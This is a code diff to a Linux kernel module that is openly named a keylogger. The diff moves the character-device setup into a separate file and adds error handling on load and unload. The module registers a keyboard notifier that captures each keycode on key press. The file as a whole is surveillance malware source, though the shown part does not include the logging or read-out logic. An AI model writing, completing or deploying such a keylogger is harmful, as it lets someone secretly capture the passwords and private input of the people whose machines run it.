@@ -1,4 +1,5 @@
 #include "keylogger.h"
+#include "fops.c"
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("8xbit");
 MODULE_VERSION("1.0");
@@ -7,19 +8,14 @@ MODULE_SUPPORTED_DEVICE("Not machine dependent");
 #define PATH = /tmp 
 /*charcter dvice Shit*/
 
-char const *chardev_name ="keylogger";
-static struct file_operations fops =
-{
-    .owner = THIS_MODULE, 
-    .read = device_read
-};
 
+int key;
+int ret = 0;
 /**/
 int notifier(struct notifier_block *block, unsigned long code, void *p)
 {
     struct keyboard_notifier_param *param;
     param =(struct keyboard_notifier_param*) p;
-    int key;
     /*needs to conect to the char dvice*/
     if (code == KBD_KEYCODE && param->down)
     {
@@ -38,13 +34,26 @@ static struct notifier_block keylogger ={.notifier_call = notifier};
 static int __init MOD_LOAD(void)
 {
     /*call the notifier*/
-    register_chrdev(123, "keylogger", &fops);
-    register_keyboard_notifier(&keylogger);
+    ret = driver_entry();
+    if (ret == -1)
+    {
+        printk(KERN_ALERT "Keylogger: unbale to load the module -> driver entry");
+        return ret;
+    }
+    ret= register_keyboard_notifier(&keylogger);
+    if (ret == -1)
+    {
+        printk(KERN_ALERT "Keylogger: unable to load the module -> keyboard notifier");
+        return ret;
+    }
+    return ret;
 
 }
 static void __exit MOD_UNLOAD(void)
 {
     unregister_keyboard_notifier(&keylogger);
+    driver_exit();
+    printk(KERN_ALERT "Keylogger: unload the module");
 } 
 module_init(MOD_LOAD);
 module_exit(MOD_UNLOAD);
